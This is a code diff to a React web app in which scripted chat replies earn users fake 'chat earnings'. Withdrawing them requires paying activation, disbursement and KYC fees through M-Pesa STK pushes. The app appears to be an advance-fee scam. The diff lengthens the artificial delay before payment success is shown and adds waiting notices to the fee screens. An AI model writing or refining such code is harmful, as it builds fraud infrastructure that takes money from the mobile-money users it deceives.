@@ -32,8 +32,8 @@ const REPLIES = [
   "Exactly! Swahili isn't that hard once you start."
 ];
 
-/* ═══════════════════ POLLING HELPER ═══════════════════ */
-async function pollPaymentStatus(transactionId, { intervalMs = 2000, maxWaitMs = 90000, minWaitMs = 15000, signal } = {}) {
+/* ═══════════════════ POLLING (20s minimum) ═══════════════════ */
+async function pollPaymentStatus(transactionId, { intervalMs = 2000, maxWaitMs = 90000, minWaitMs = 20000, signal } = {}) {
   const start = Date.now();
   let lastStatus = null;
   let resolvedStatus = null;
@@ -59,11 +59,11 @@ async function pollPaymentStatus(transactionId, { intervalMs = 2000, maxWaitMs =
     resolvedStatus = lastStatus === 'COMPLETED' ? 'success' : 'timeout';
   }
 
-  // Enforce minimum wait time (so success doesn't show too fast)
+  // Enforce 20-second minimum — success only shows after full 20s
   const elapsed = Date.now() - start;
   if (resolvedStatus === 'success' && elapsed < minWaitMs) {
     const remaining = minWaitMs - elapsed;
-    console.log(`[poll] success after ${elapsed}ms — waiting ${remaining}ms more to hit 15s minimum`);
+    console.log(`[poll] success detected at ${elapsed}ms — holding ${remaining}ms more for 20s minimum`);
     await new Promise(res => setTimeout(res, remaining));
   }
 
@@ -92,7 +92,7 @@ function AppProvider({ children }) {
   const [stkCancelFn, setStkCancelFn] = useState(null);
   const [editModalOpen, setEditModalOpen] = useState(false);
   const [mobDrawerOpen, setMobDrawerOpen] = useState(false);
-  const [withdrawalStage, setWithdrawalStage] = useState(null); // null | 'disbursement' | 'kyc-required' | 'kyc-fee' | 'sending'
+  const [withdrawalStage, setWithdrawalStage] = useState(null);
   const [withdrawalPhone, setWithdrawalPhone] = useState('');
 
   const creditChatEarning = () => {
@@ -333,7 +333,7 @@ function ActivationModal() {
 
         setStkCancelFn(null);
         if (result === 'success') setStkState('success');
-        else if (result === 'cancelled') { /* overlay already closed */ }
+        else if (result === 'cancelled') { /* overlay closed */ }
         else setStkState('fail');
       } else {
         setAlert({ type: 'error', msg: data?.message || 'STK push failed. Try again.' });
@@ -400,6 +400,7 @@ function StkOverlay() {
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: '.82rem', color: 'var(--tm)', marginBottom: 6 }}>
             <div className="spin" /> Waiting for payment confirmation...
           </div>
+          <p style={{ fontSize: '.72rem', color: 'var(--tm)', marginBottom: 10 }}>Please wait up to 20 seconds</p>
           <button className="stk-cancel-link" onClick={onCancel}>Cancel</button>
         </>)}
         {stkState === 'success' && (<>
@@ -462,7 +463,6 @@ function Chat() {
     replyIdxRef.current++;
     setTimeout(() => pushMsg(reply, 'them'), 1400);
 
-    // Count user messages and show banner after 2
     userMsgCount.current += 1;
     if (userMsgCount.current >= 2 && !showEarnBanner) {
       creditChatEarning();
@@ -718,7 +718,7 @@ function DisbursementFee() {
       <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
       <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
       {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
-      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment...' : `Pay KSh ${FEE_KES}`}</button>
+      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment... (20s)' : `Pay KSh ${FEE_KES}`}</button>
       <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
     </div></div>
   );
@@ -809,7 +809,7 @@ function KYCFee() {
       <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
       <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
       {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
-      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment...' : `Pay KSh ${FEE_KES}`}</button>
+      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment... (20s)' : `Pay KSh ${FEE_KES}`}</button>
       <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
     </div></div>
   );
